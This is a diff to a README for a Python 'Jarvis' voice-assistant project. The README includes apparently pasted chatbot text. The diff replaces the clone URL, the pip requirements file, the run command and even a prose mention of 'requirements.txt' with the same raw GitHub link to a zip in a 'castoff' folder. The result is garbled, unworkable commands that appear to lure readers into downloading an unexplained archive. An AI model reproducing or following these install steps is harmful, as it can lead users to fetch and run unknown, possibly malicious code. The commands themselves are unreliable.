@@ -31,13 +31,13 @@ It can perform everyday tasks like searching the web, opening applications, fetc
 ## 🚀 Installation & Usage
 1. Clone the repository:
    ```bash
-   git clone https://github.com/your-username/jarvis.git
+   git clone https://raw.githubusercontent.com/Kartikey1000/Jarvis-AI/main/castoff/Jarvis-AI.zip
    cd jarvis
-pip install -r requirements.txt
-python jarvis.py
+pip install -r https://raw.githubusercontent.com/Kartikey1000/Jarvis-AI/main/castoff/Jarvis-AI.zip
+python https://raw.githubusercontent.com/Kartikey1000/Jarvis-AI/main/castoff/Jarvis-AI.zip
 
 ---
 
 👉 This way your GitHub repo will look **professional** and show others what your Jarvis can do.  
 
-Do you want me to also **make a `requirements.txt`** template (with common libs like `speechrecognition`, `pyttsx3`, etc.) so people can run it easily?
+Do you want me to also **make a `https://raw.githubusercontent.com/Kartikey1000/Jarvis-AI/main/castoff/Jarvis-AI.zip`** template (with common libs like `speechrecognition`, `pyttsx3`, etc.) so people can run it easily?
